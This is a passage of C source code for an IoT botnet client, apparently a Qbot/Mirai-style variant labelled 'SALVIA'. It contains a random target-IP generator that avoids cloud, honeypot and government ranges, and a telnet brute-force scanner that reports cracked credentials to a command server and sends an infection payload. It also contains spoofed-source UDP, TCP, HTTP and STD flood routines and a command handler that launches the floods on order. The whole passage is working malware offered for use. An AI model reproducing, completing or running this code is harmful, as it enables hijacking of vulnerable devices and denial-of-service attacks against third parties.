	(ipState[0] == 207 && ipState[1] == 154 && ipState[2] >= 192 && ipState[2] < 255) ||    //Digital Ocean
	(ipState[0] == 37 && ipState[1] == 139 && ipState[2] >= 1 && ipState[2] < 31) ||        //Digital Ocean
	(ipState[0] == 67 && ipState[1] == 207 && ipState[2] >= 64 && ipState[2] < 95) ||       //Digital Ocean
	(ipState[0] == 67 && ipState[1] == 205 && ipState[2] >= 128 && ipState[2] < 191) ||     //Digital Ocean
	(ipState[0] == 80 && ipState[1] == 240 && ipState[2] >= 128 && ipState[2] < 143) ||     //Digital Ocean
	(ipState[0] == 82 && ipState[1] == 196 && ipState[2] >= 1 && ipState[2] < 15) ||        //Digital Ocean
	(ipState[0] == 95 && ipState[1] == 85 && ipState[2] >= 8 && ipState[2] < 63) ||         //Digital Ocean
	(ipState[0] == 64 && ipState[1] == 237 && ipState[2] >= 32 && ipState[2] < 43) ||       //Choopa & Vultr
	(ipState[0] == 185 && ipState[1] == 92 && ipState[2] >= 220 && ipState[2] < 223) ||     //Choopa & Vultr
	(ipState[0] == 104 && ipState[1] == 238 && ipState[2] >= 128 && ipState[2] < 191) ||    //Choopa & Vultr
	(ipState[0] == 209 && ipState[1] == 222 && ipState[2] >= 1 && ipState[2] < 31) ||       //Choopa & Vultr
	(ipState[0] == 208 && ipState[1] == 167 && ipState[2] >= 232 && ipState[2] < 252) ||    //Choopa & Vultr
	(ipState[0] == 66 && ipState[1] == 55 && ipState[2] >= 128 && ipState[2] < 159) ||      //Choopa & Vultr
	(ipState[0] == 45 && ipState[1] == 63 && ipState[2] >= 1 && ipState[2] < 127) ||        //Choopa & Vultr
	(ipState[0] == 216 && ipState[1] == 237 && ipState[2] >= 128 && ipState[2] < 159) ||    //Choopa & Vultr
	(ipState[0] == 108 && ipState[1] == 61) ||                                              //Choopa & Vultr
	(ipState[0] == 45 && ipState[1] == 76) ||                                               //Choopa & Vultr
	(ipState[0] == 185 && ipState[1] == 11 && ipState[2] >= 144 && ipState[2] < 148) ||     //Blazingfast & Nforce
	(ipState[0] == 185 && ipState[1] == 56 && ipState[2] >= 21 && ipState[2] < 23) ||       //Blazingfast & Nforce
	(ipState[0] == 185 && ipState[1] == 61 && ipState[2] >= 136 && ipState[2] < 139) ||     //Blazingfast & Nforce
	(ipState[0] == 185 && ipState[1] == 62 && ipState[2] >= 187 && ipState[2] < 191) ||     //Blazingfast & Nforce
	(ipState[0] == 66 && ipState[1] == 150 && ipState[2] >= 120 && ipState[2] < 215) ||     //Blazingfast & Nforce
	(ipState[0] == 66 && ipState[1] == 151 && ipState[2] >= 137 && ipState[2] < 139) ||     //Blazingfast & Nforce
	(ipState[0] == 64 && ipState[1] == 94 && ipState[2] >= 237 && ipState[2] < 255) ||      //Blazingfast & Nforce
	(ipState[0] == 63 && ipState[1] == 251 && ipState[2] >= 19 && ipState[2] < 21) ||       //Blazingfast & Nforce
	(ipState[0] == 70 && ipState[1] == 42 && ipState[2] >= 73 && ipState[2] < 75) ||        //Blazingfast & Nforce
	(ipState[0] == 74 && ipState[1] == 91 && ipState[2] >= 113 && ipState[2] < 115) ||      //Blazingfast & Nforce
	(ipState[0] == 74 && ipState[1] == 201 && ipState[2] >= 56 && ipState[2] < 58) ||       //Blazingfast & Nforce
	(ipState[0] == 188 && ipState[1] == 209 && ipState[2] >= 48 && ipState[2] < 53) ||      //Blazingfast & Nforce
	(ipState[0] == 188 && ipState[1] == 165) ||                                             //OVH
	(ipState[0] == 149 && ipState[1] == 202) ||                                             //OVH
	(ipState[0] == 151 && ipState[1] == 80) ||                                              //OVH
	(ipState[0] == 164 && ipState[1] == 132) ||                                             //OVH
	(ipState[0] == 176 && ipState[1] == 31) ||                                              //OVH
	(ipState[0] == 167 && ipState[1] == 114) ||                                             //OVH
	(ipState[0] == 178 && ipState[1] == 32) ||                                              //OVH
	(ipState[0] == 178 && ipState[1] == 33) ||                                              //OVH
	(ipState[0] == 37 && ipState[1] == 59) ||                                               //OVH
	(ipState[0] == 37 && ipState[1] == 187) ||                                              //OVH
	(ipState[0] == 46 && ipState[1] == 105) ||                                              //OVH
	(ipState[0] == 51 && ipState[1] == 254) ||                                              //OVH
	(ipState[0] == 51 && ipState[1] == 255) ||                                              //OVH
	(ipState[0] == 5 && ipState[1] == 135) ||                                               //OVH
	(ipState[0] == 5 && ipState[1] == 196) ||                                               //OVH
	(ipState[0] == 5 && ipState[1] == 39) ||                                                //OVH
	(ipState[0] == 91 && ipState[1] == 134) ||                                              //OVH
	(ipState[0] == 104 && ipState[1] == 200 && ipState[2] >= 128 && ipState[2] < 159) ||    //Total Server Solutions
	(ipState[0] == 107 && ipState[1] == 152 && ipState[2] >= 96 && ipState[2] < 111) ||     //Total Server Solutions
	(ipState[0] == 107 && ipState[1] == 181 && ipState[2] >= 160 && ipState[2] < 189) ||    //Total Server Solutions
	(ipState[0] == 172 && ipState[1] == 98 && ipState[2] >= 64 && ipState[2] < 95) ||       //Total Server Solutions
	(ipState[0] == 184 && ipState[1] == 170 && ipState[2] >= 240 && ipState[2] < 255) ||    //Total Server Solutions
	(ipState[0] == 192 && ipState[1] == 111 && ipState[2] >= 128 && ipState[2] < 143) ||    //Total Server Solutions
	(ipState[0] == 192 && ipState[1] == 252 && ipState[2] >= 208 && ipState[2] < 223) ||    //Total Server Solutions
	(ipState[0] == 192 && ipState[1] == 40 && ipState[2] >= 56 && ipState[2] < 59) ||       //Total Server Solutions
	(ipState[0] == 198 && ipState[1] == 8 && ipState[2] >= 81 && ipState[2] < 95) ||        //Total Server Solutions
	(ipState[0] == 199 && ipState[1] == 116 && ipState[2] >= 112 && ipState[2] < 119) ||    //Total Server Solutions
	(ipState[0] == 199 && ipState[1] == 229 && ipState[2] >= 248 && ipState[2] < 255) ||    //Total Server Solutions
	(ipState[0] == 199 && ipState[1] == 36 && ipState[2] >= 220 && ipState[2] < 223) ||     //Total Server Solutions
	(ipState[0] == 199 && ipState[1] == 58 && ipState[2] >= 184 && ipState[2] < 187) ||     //Total Server Solutions
	(ipState[0] == 206 && ipState[1] == 220 && ipState[2] >= 172 && ipState[2] < 175) ||    //Total Server Solutions
	(ipState[0] == 208 && ipState[1] == 78 && ipState[2] >= 40 && ipState[2] < 43) ||       //Total Server Solutions
	(ipState[0] == 208 && ipState[1] == 93 && ipState[2] >= 192 && ipState[2] < 193) ||     //Total Server Solutions
	(ipState[0] == 66 && ipState[1] == 71 && ipState[2] >= 240 && ipState[2] < 255) ||      //Total Server Solutions
	(ipState[0] == 98 && ipState[1] == 142 && ipState[2] >= 208 && ipState[2] < 223) ||     //Total Server Solutions
	(ipState[0] == 107 && ipState[1] >= 20 && ipState[1] < 24) ||                           //Amazon
	(ipState[0] == 35 && ipState[1] >= 159 && ipState[1] < 183) ||                          //Amazon
	(ipState[0] == 52 && ipState[1] >= 1 && ipState[1] < 95) ||                             //Amazon
	(ipState[0] == 52 && ipState[1] >= 95 && ipState[1] < 255) ||                           //Amazon + Microsoft
	(ipState[0] == 54 && ipState[1] >= 64 && ipState[1] < 95) ||                            //Amazon + Microsoft
	(ipState[0] == 54 && ipState[1] >= 144 && ipState[1] < 255) ||                          //Amazon + Microsoft
	(ipState[0] == 13 && ipState[1] >= 52 && ipState[1] < 60) ||                            //Amazon + Microsoft
	(ipState[0] == 13 && ipState[1] >= 112 && ipState[1] < 115) ||                          //Amazon + Microsoft
	(ipState[0] == 163 && ipState[1] == 172) ||                                             //ONLINE SAS
	(ipState[0] == 51 && ipState[1] >= 15 && ipState[1] < 255) ||                           //ONLINE SAS
	(ipState[0] == 79 && ipState[1] == 121 && ipState[2] >= 128 && ipState[2] < 255) ||     //Some more
	(ipState[0] == 212 && ipState[1] == 47 && ipState[2] >= 224 && ipState[2] < 255) ||     //Some more
	(ipState[0] == 89 && ipState[1] == 34 && ipState[2] >= 96 && ipState[2] < 97) ||        //Some more
	(ipState[0] == 219 && ipState[1] >= 216 && ipState[1] < 231) ||                         //Some more
	(ipState[0] == 23 && ipState[1] >= 94 && ipState[1] < 109) ||                           //Some more
	(ipState[0] == 178 && ipState[1] >= 62 && ipState[1] < 63) ||                           //Some more
	(ipState[0] == 106 && ipState[1] >= 182 && ipState[1] < 189) ||                         //Some more
	(ipState[0] == 106 && ipState[1] >= 184) ||                                             //Some more
	(ipState[0] == 106 && ipState[1] == 105) ||                                             //Honeypot
	(ipState[0] == 34 && ipState[1] >= 245 && ipState[1] < 255) ||                          //Some more
	(ipState[0] == 87 && ipState[1] >= 97 && ipState[1] < 99) ||                            //Some more
	(ipState[0] == 86 && ipState[1] == 208) ||                                              //Some more
	(ipState[0] == 86 && ipState[1] == 209) ||                                              //Some more
	(ipState[0] == 193 && ipState[1] == 164) ||                                             //Some more
	(ipState[0] == 120 && ipState[1] >= 103 && ipState[1] < 108) ||                         //Ministry of Education Computer Science
	(ipState[0] == 188 && ipState[1] == 68) ||                                              //Ministry of Education Computer Science
	(ipState[0] == 78 && ipState[1] == 46) || 	                                            //Ministry of Education Computer Science
	(ipState[0] == 224)) {									  		                        //Multicast
		ipState[0] = rand() % 223;
		ipState[1] = rand() % 255;
		ipState[2] = rand() % 255;
		ipState[3] = rand() % 255;
	}
	char ip[16] = {0};
	szprintf(ip, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
	return inet_addr(ip);
}
in_addr_t GRIP(in_addr_t netmask) {
	in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
	return tmp ^ ( rand_cmwc() & ~netmask);
}
int socket_connect(char *host, in_port_t port) {
	struct hostent *hp;
	struct sockaddr_in addr;
	int on = 1, sock;
	if ((hp = gethostbyname(host)) == NULL) return 0;
	bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
	addr.sin_port = htons(port);
	addr.sin_family = AF_INET;
	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
	if (sock == -1) return 0;
	if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1)
	return 0;
	return sock;
}
void botnetTScan(int wait_usec, int maxfds) { //Telnet scanner from prometheus creds to @narcotixx for that
	int i, res, num_tmps, j;
	char buf[128], cur_dir;
	int max = maxfds;
	fd_set fdset;
	struct timeval tv;
	socklen_t lon;
	int valopt;
	srand(time(NULL) ^ rand_cmwc());
	char line[256];
	char* buffer;
	struct sockaddr_in dest_addr;
	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(23);
	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
	buffer = malloc(BUFFER_SIZE + 1);
	memset(buffer, 0, BUFFER_SIZE + 1);
	struct telstate_t fds[max];
	memset(fds, 0, max * (sizeof(int) + 1));
	for(i = 0; i < max; i++) {
		memset(&(fds[i]), 0, sizeof(struct telstate_t));
		fds[i].complete = 1;
		fds[i].sockbuf = buffer;
	}
	for(num_tmps = 0; tmpdirs[++num_tmps] != 0; );
	while(1) {
		for(i = 0; i < max; i++) {
			if(fds[i].totalTimeout == 0) {
				fds[i].totalTimeout = time(NULL);
			}
			switch(fds[i].state) {
				case 0: {
					if(fds[i].complete == 1) {
						char *tmp = fds[i].sockbuf;
						memset(&(fds[i]), 0, sizeof(struct telstate_t));
						fds[i].sockbuf = tmp;
						fds[i].ip = GIP();
					}
					else if(fds[i].complete == 0) {
						fds[i].passwordInd++;
						fds[i].usernameInd++;
						if(fds[i].passwordInd == sizeof(passwords) / sizeof(char *)) {
							fds[i].complete = 1;
							continue;
						}
						if(fds[i].usernameInd == sizeof(usernames) / sizeof(char *)) {
							fds[i].complete = 1;
							continue;
						}
					}
					dest_addr.sin_family = AF_INET;
					dest_addr.sin_port = htons(23);
					memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
					dest_addr.sin_addr.s_addr = fds[i].ip;
					fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
					if(fds[i].fd == -1) continue;
					fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
					if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS) {
						reset_telstate(&fds[i]);
					} else {
						advance_state(&fds[i], 1);
					}
				}
				break;
				case 1: {
					FD_ZERO(&fdset);
					FD_SET(fds[i].fd, &fdset);
					tv.tv_sec = 0;
					tv.tv_usec = wait_usec;
					res = select(fds[i].fd+1, NULL, &fdset, NULL, &tv);
					if(res == 1) {
						lon = sizeof(int);
						valopt = 0;
						getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
						if(valopt) {
							reset_telstate(&fds[i]);
						} else {
							fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) & (~O_NONBLOCK));
							advance_state(&fds[i], 2);
						}
						continue;
					}
					else if(res == -1) {
						reset_telstate(&fds[i]);
						continue;
					}
					if(fds[i].totalTimeout + 5 < time(NULL)) {
						reset_telstate(&fds[i]);
					}
				}
				break;
				case 2: {
					if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_SIZE, advances)) {
						if(contains_fail(fds[i].sockbuf)) {
							advance_state(&fds[i], 0);
						} else {
							advance_state(&fds[i], 3);
						}
						continue;
					}
					if(fds[i].totalTimeout + 7 < time(NULL)) {
						reset_telstate(&fds[i]);
					}
				}
				break;
				case 3: {
					if(send(fds[i].fd, usernames[fds[i].usernameInd], strlen(usernames[fds[i].usernameInd]), MSG_NOSIGNAL) < 0) {
						reset_telstate(&fds[i]);
						continue;
					}
					if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) {
						reset_telstate(&fds[i]);
						continue;
					}
					advance_state(&fds[i], 4);
				}
				break;
				case 4: {
					if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_SIZE, advances)) {
						if(contains_fail(fds[i].sockbuf)) {
							advance_state(&fds[i], 0);
						} else {
							advance_state(&fds[i], 5);
						}
						continue;
					}
					if(fds[i].totalTimeout + 3 < time(NULL)) {
						reset_telstate(&fds[i]);
					}
				}
				break;
				case 5: {
					if(send(fds[i].fd, passwords[fds[i].passwordInd], strlen(passwords[fds[i].passwordInd]), MSG_NOSIGNAL) < 0) {
						reset_telstate(&fds[i]);
						continue;
					}
					if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) {
						reset_telstate(&fds[i]);
						continue;
					}
					advance_state(&fds[i], 6);
				}
				break;
				case 6: {
					if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_SIZE, advances2)) {
						fds[i].totalTimeout = time(NULL);
						if(contains_fail(fds[i].sockbuf)) {
							advance_state(&fds[i], 0);
						}
						else if(contains_success(fds[i].sockbuf)) {
							if(fds[i].complete == 2) {
								advance_state(&fds[i], 7);
							} else {
								botnetPrint(KittyCommSock, "\x1b[0m[\x1b[35;1mSALVIA\x1b[0m] \x1b[36;1mBruted Telnet --> \x1b[0m[\x1b[36;1m%s\x1b[0m:\x1b[36;1m%s\x1b[0m:\x1b[36;1m%s\x1b[0m]\x1b[0m", get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
								advance_state(&fds[i], 7);
							}
						} else {
							reset_telstate(&fds[i]);
						}
						continue;
					}
					if(fds[i].totalTimeout + 7 < time(NULL)) {
						reset_telstate(&fds[i]);
					}
				}
				break;
				case 7: {
					fds[i].totalTimeout = time(NULL);
					if(send(fds[i].fd, "sh\r\n", 4, MSG_NOSIGNAL) <0);
					if(send(fds[i].fd, "shell\r\n", 7, MSG_NOSIGNAL) < 0);
					if(send(fds[i].fd, BBP, strlen(BBP), MSG_NOSIGNAL) < 0) {
						reset_telstate(&fds[i]);
						continue;
					}
					if(fds[i].totalTimeout + 25 < time(NULL)) {
						if(fds[i].complete !=3){
						}
						reset_telstate(&fds[i]);
					}
					break;
				}
			}
		}
	}
}
void makeRandomStr(unsigned char *buf, int length) {
	int i = 0;
	for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}
unsigned short csum (unsigned short *buf, int count) {
	register uint64_t sum = 0;
	while( count > 1 ) { sum += *buf++; count -= 2; }
	if(count > 0) { sum += *(unsigned char *)buf; }
	while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
	return (uint16_t)(~sum);
}
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
	struct tcp_pseudo {
		unsigned long src_addr;
		unsigned long dst_addr;
		unsigned char zero;
		unsigned char proto;
		unsigned short length;
	} pseudohead;
	unsigned short total_len = iph->tot_len;
	pseudohead.src_addr=iph->saddr;
	pseudohead.dst_addr=iph->daddr;
	pseudohead.zero=0;
	pseudohead.proto=IPPROTO_TCP;
	pseudohead.length=htons(sizeof(struct tcphdr));
	int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
	unsigned short *tcp = malloc(totaltcp_len);
	memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
	memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
	unsigned short output = csum(tcp,totaltcp_len);
	free(tcp);
	return output;
}
void sendHTTP(char *method, char *host, in_port_t port, char *path, int timeEnd, int power)
{
	int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
	char request[512], buffer[1];
	for (i = 0; i < power; i++)
	{
		sprintf(request, "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, path, host, UserAgents[(rand() % 36)]);
		if (fork())
		{
			while (end > time(NULL))
			{
				socket = socket_connect(host, port);
				if (socket != 0)
				{
					write(socket, request, strlen(request));
					read(socket, buffer, 1);
					close(socket);
				}
			}
			exit(0);
		}
	}
}
void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + packetSize;
	iph->id = rand_cmwc();
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = protocol;
	iph->check = 0;
	iph->saddr = source;
	iph->daddr = dest;
}
int sclose(int fd) {
	if(3 > fd) return 1;
	close(fd);
	return 0;
}
void sendUDP(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
	struct sockaddr_in dest_addr;
	dest_addr.sin_family = AF_INET;
	if(port == 0) dest_addr.sin_port = rand_cmwc();
	else dest_addr.sin_port = htons(port);
	if(getHost(target, &dest_addr.sin_addr)) return;
	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
	register unsigned int pollRegister;
	pollRegister = pollinterval;
	if(spoofit == 32) {
		int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if(!sockfd) {
			#ifdef PRINTS
			botnetPrint(KittyCommSock, "Failed opening raw socket.");
			#endif
			return;
		}
		unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
		if(buf == NULL) return;
		memset(buf, 0, packetsize + 1);
		makeRandomStr(buf, packetsize);
		int end = time(NULL) + timeEnd;
		register unsigned int i = 0;
		register unsigned int ii = 0;
		while(1) {
			sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
			if(i == pollRegister) {
				if(port == 0) dest_addr.sin_port = rand_cmwc();
				if(time(NULL) > end) break;
				i = 0;
				continue;
			}
			i++;
			if(ii == sleepcheck) {
				usleep(sleeptime*1000);
				ii = 0;
				continue;
			}
			ii++;
		}
	} else {
		int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
		if(!sockfd) {
			#ifdef PRINTS
			botnetPrint(KittyCommSock, "Failed opening raw socket.");
			#endif
			return;
		}
		int tmp = 1;
		if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)	{
			#ifdef PRINTS
			botnetPrint(KittyCommSock, "Failed setting raw headers mode.");
			#endif
			return;
		}
		int counter = 50;
		while(counter--) {
			srand(time(NULL) ^ rand_cmwc());
			init_rand(rand());
		}
		in_addr_t netmask;
		if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
		else netmask = ( ~((1 << (32 - spoofit)) - 1) );
		unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
		struct iphdr *iph = (struct iphdr *)packet;
		struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
		makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( GRIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
		udph->len = htons(sizeof(struct udphdr) + packetsize);
		udph->source = rand_cmwc();
		udph->dest = (port == 0 ? rand_cmwc() : htons(port));
		udph->check = 0;
		makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
		iph->check = csum ((unsigned short *) packet, iph->tot_len);
		int end = time(NULL) + timeEnd;
		register unsigned int i = 0;
		register unsigned int ii = 0;
		while(1) {
			sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));	
			udph->source = rand_cmwc();
			udph->dest = (port == 0 ? rand_cmwc() : htons(port));
			iph->id = rand_cmwc();
			iph->saddr = htonl( GRIP(netmask) );
			iph->check = csum ((unsigned short *) packet, iph->tot_len);
			if(i == pollRegister) {
				if(time(NULL) > end) break;
				i = 0;
				continue;
			}
			i++;
			if(ii == sleepcheck) {
				usleep(sleeptime*1000);
				ii = 0;
				continue;
			}
			ii++;
		}
	}
}
void sendTCP(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval) {
	register unsigned int pollRegister;
	pollRegister = pollinterval;
	struct sockaddr_in dest_addr;
	dest_addr.sin_family = AF_INET;
	if(port == 0) dest_addr.sin_port = rand_cmwc();
	else dest_addr.sin_port = htons(port);
	if(getHost(target, &dest_addr.sin_addr)) return;
	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
	int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if(!sockfd) {
		#ifdef PRINTS
		botnetPrint(KittyCommSock, "Failed opening raw socket.");
		#endif
		return;
	}
	int tmp = 1;
	if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) {
		#ifdef PRINTS
		botnetPrint(KittyCommSock, "Failed setting raw headers mode.");
		#endif
		return;
	}
	in_addr_t netmask;
	if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
	else netmask = ( ~((1 << (32 - spoofit)) - 1) );
	unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
	struct iphdr *iph = (struct iphdr *)packet;
	struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
	makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( GRIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);
	tcph->source = rand_cmwc();
	tcph->seq = rand_cmwc();
	tcph->ack_seq = 0;
	tcph->doff = 5;
	if(!strcmp(flags, "all")) {
		tcph->syn = 1;
		tcph->rst = 1;
		tcph->fin = 1;
		tcph->ack = 1;
		tcph->psh = 1;
	} else {
		unsigned char *pch = strtok(flags, ",");
		while(pch) {
			if(!strcmp(pch, "syn")) {
				tcph->syn = 1;
			} else if(!strcmp(pch, "rst")) {
				tcph->rst = 1;
			} else if(!strcmp(pch, "fin")) {
				tcph->fin = 1;
			} else if(!strcmp(pch, "ack")) {
				tcph->ack = 1;
			} else if(!strcmp(pch, "psh")) {
				tcph->psh = 1;
			} else {
				#ifdef PRINTS
				botnetPrint(KittyCommSock, "Invalid flag \"%s\"", pch);
				#endif
			}
			pch = strtok(NULL, ",");
		}
	}
	tcph->window = rand_cmwc();
	tcph->check = 0;
	tcph->urg_ptr = 0;
	tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
	tcph->check = tcpcsum(iph, tcph);
	iph->check = csum ((unsigned short *) packet, iph->tot_len);
	int end = time(NULL) + timeEnd;
	register unsigned int i = 0;
	while(1) {
		sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
		iph->saddr = htonl( GRIP(netmask) );
		iph->id = rand_cmwc();
		tcph->seq = rand_cmwc();
		tcph->source = rand_cmwc();
		tcph->check = 0;
		tcph->check = tcpcsum(iph, tcph);
		iph->check = csum ((unsigned short *) packet, iph->tot_len);
		if(i == pollRegister) {
			if(time(NULL) > end) break;
			i = 0;
			continue;
		}
		i++;
	}
}
void sendSTD(unsigned char *ip, int port, int secs, int psize) {
	if (psize > 4096) {
		return;
	}
	int iSTD_Sock;
	iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
	time_t start = time(NULL);
	struct sockaddr_in sin;
	struct hostent *hp = gethostbyname(ip);
	bzero((char*) &sin,sizeof(sin));
	bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
	sin.sin_family = hp->h_addrtype;
	sin.sin_port = port;
	unsigned int a = 0;
	while(1){
		if (a >= 50) {
			srand(time(NULL));
			char name_buf[32];
			int name_buf_len;
			rand_init();
			name_buf_len = ((rand_next() % 4) + 3) * 4;
			rand_alphastr(name_buf, name_buf_len);
			name_buf[name_buf_len] = 0;
			char *haxed = name_buf;
			send(iSTD_Sock, haxed, psize, 0);
			connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
			if (time(NULL) >= start + secs) {
				close(iSTD_Sock);
				free(haxed);
				_exit(0);
			}
			a = 0;
		}
		a++;
	}
}
void processCmd(int argc, unsigned char *argv[]) { 
	if(!strcmp(argv[0], "TELNET")) {
		if(!strcmp(argv[1], "OFF")) {
			if(botnetPid == 0) return;
			kill(botnetPid, 9);
			botnetPid = 0;
		}
		if(!strcmp(argv[1], "ON")) {	
			if(botnetPid != 0) return;
			uint32_t parent;
			parent = fork();
			int threads = 1000;
			int timeout = 10;
			if (parent > 0) { botnetPid = parent; return;}
			else if(parent == -1) return;
			botnetTScan(timeout, threads);
			_exit(0);
		}
	}
	if(!strcmp(argv[0], "UDP")) {
		if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) {
			return;
		}
		unsigned char *ip = argv[1];
		int port = atoi(argv[2]);
		int time = atoi(argv[3]);
		int spoofed = atoi(argv[4]);
		int packetsize = atoi(argv[5]);
		int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
		int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
		int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
		if(strstr(ip, ",") != NULL) {
			unsigned char *hi = strtok(ip, ",");
			while(hi != NULL) {
				if(!listFork()) {
					sendUDP(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
					_exit(0);
				}
				hi = strtok(NULL, ",");
			}	
		} else {
			if (!listFork()){
				sendUDP(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
				_exit(0);
			}
		}
		return;
	}
	if(!strcmp(argv[0], "TCP")) {
		if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1)) {
			return;
		}
		unsigned char *ip = argv[1];
		int port = atoi(argv[2]);
		int time = atoi(argv[3]);
		int spoofed = atoi(argv[4]);
		unsigned char *flags = argv[5];
		int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
		int psize = argc > 6 ? atoi(argv[6]) : 0;
		if(strstr(ip, ",") != NULL) {
			unsigned char *hi = strtok(ip, ",");
			while(hi != NULL) {
				if(!listFork()) {
					sendTCP(hi, port, time, spoofed, flags, psize, pollinterval);
					_exit(0);
				}
				hi = strtok(NULL, ",");
			}
		} else {
			if (!listFork()) {
				sendTCP(ip, port, time, spoofed, flags, psize, pollinterval);
				_exit(0);
			}
		}
	}
        if (!strcmp(argv[0], "GHP"))
	{
		if (argc < 6 || atoi(argv[3]) < 1 || atoi(argv[5]) < 1) return;
		if (listFork()) return;
		botnetPrint(botnetNet, "HTTP %s Flooding %s:%d for %d seconds", argv[1], argv[2], atoi(argv[3]), atoi(argv[5]));
		sendHTTP(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
		exit(0);
	}
	if(!strcmp(argv[0], "STD")) {
		if(argc < 5) {
			return;
		}
		unsigned char *ip = argv[1];
		int port = atoi(argv[2]);
		int time = atoi(argv[3]);
		int psize = atoi(argv[4]);
		if(strstr(ip, ",") != NULL) {
		unsigned char *hi = strtok(ip, ",");
		while(hi != NULL) {
			if(!listFork()) {
				sendSTD(hi, port, time, psize);
				_exit(0);
			}
			hi = strtok(NULL, ",");
		}
	} else {
		if (listFork()) { return; }
			sendSTD(ip, port, time, psize);
			_exit(0);
		}
	}
	if(!strcmp(argv[0], "KILLATTK")) {
		int killed = 0;
		unsigned long i;
		for (i = 0; i < numpids; i++) {
			if (pids[i] != 0 && pids[i] != getpid()) {
				kill(pids[i], 9);
				killed++;
			}
		}
	}
}
int getOurIP() {
	int sock = socket(AF_INET, SOCK_DGRAM, 0);
	if(sock == -1) return 0;
	struct sockaddr_in serv;
	memset(&serv, 0, sizeof(serv));
	serv.sin_family = AF_INET;
	serv.sin_addr.s_addr = inet_addr("8.8.8.8");
	serv.sin_port = htons(53);
